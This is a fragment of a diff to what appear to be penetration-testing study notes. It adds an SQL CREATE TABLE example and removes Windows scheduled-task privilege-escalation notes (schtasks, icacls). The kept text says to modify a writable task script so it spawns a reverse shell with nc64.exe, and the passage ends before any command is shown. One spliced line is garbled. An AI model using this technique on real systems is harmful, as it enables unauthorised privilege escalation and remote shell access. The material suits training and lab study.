+    date_of_joining DATETIME DEFAULT NOW(),
+
+Finally, one of the most important properties is PRIMARY KEY, which we can use to uniquely identify each record in the table, referring to all data of a record within a table for relational databases, as previously discussed in the previous section. We can make the id column the PRIMARY KEY for this table:
+Code: sql
+
+    PRIMARY KEY (id)
+
+The final CREATE TABLE query will be as follows:
+Code: sql
+
+CREATE TABLE logins (
+    id INT NOT NULL AUTO_INCREMENT,
+    username VARCHAR(100) UNIQUE NOT NULL,
+    password VARCHAR(100) NOT NULL,
+    date_of_joining DATETIME DEFAULT NOW(),
+    PRIMARY KEY (id)
+    );
+
+Note: Allow 10-15 seconds for the servers in the questions to start, to allow enough time for Apache/MySQL to initiate and run.
+
+
+
+
+
+
+
+
 
 
 
@@ -19886,20 +20633,7 @@ Search Centric
 		/etc/cron.d
 		/var/spool/cron/crontabs/root
 		
-	> Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
-	[+] Commands	
-		net start //Services running in the background
-        	wmic service list brief
-        	tasklist /svc //List services running under that particular process
-  		schtasks /query /fo list /v
-      		schtasks /query /tn vulntask /fo list /v ==> vulntask = task 
-
-	> Scheduled tasks can be listed from the command line using the schtasks command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
-	> You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
-	> If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
-		C:\> icacls c:\tasks\schtask.bat
-		c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
-		                    BUILTIN\Administrators:(I)(F)
+	> Looking into scheduledF)
 		                    BUILTIN\Users:(I)(F)
 
 	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
